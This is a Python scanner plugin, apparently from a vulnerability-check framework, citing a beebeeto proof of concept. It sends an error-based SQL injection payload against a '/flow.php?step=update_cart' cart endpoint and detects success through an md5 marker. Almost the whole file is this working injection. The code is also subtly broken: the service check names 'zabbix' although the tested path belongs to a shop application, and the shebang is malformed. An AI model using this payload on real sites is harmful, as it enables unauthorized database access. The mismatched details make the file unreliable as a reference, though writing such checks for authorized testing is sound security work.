# !/usr/bin/dev python
# -*- coding:utf-8 -*-

"""
reference:
http://www.beebeeto.com/pdb/poc-2015-0061/
"""


def assign(service, arg):
    if service == 'zabbix':
        return True, arg
    pass


def audit(arg):
    url = arg + '/flow.php?step=update_cart'
    payload = ("goods_number%5B1%27+and+%28select+1+from%28select+count%28"
                  "*%29%2Cconcat%28%28select+%28select+%28SELECT+md5(3.1415)%29%29"
                  "+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand"
                  "%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29"
                  "+and+1%3D1+%23%5D=1&submit=exp ")
    code, head, res, errcode, finalurl = curl.curl('-d ' + payload + url)
    if code == 200:
        if '63e1f04640e83605c1d177544a5a0488' in res:
            security_hole(url)
    pass


if __name__ == "__main__":
    from dummy import *
    audit(assign('zabbix', 'http://www.example.com/')[1])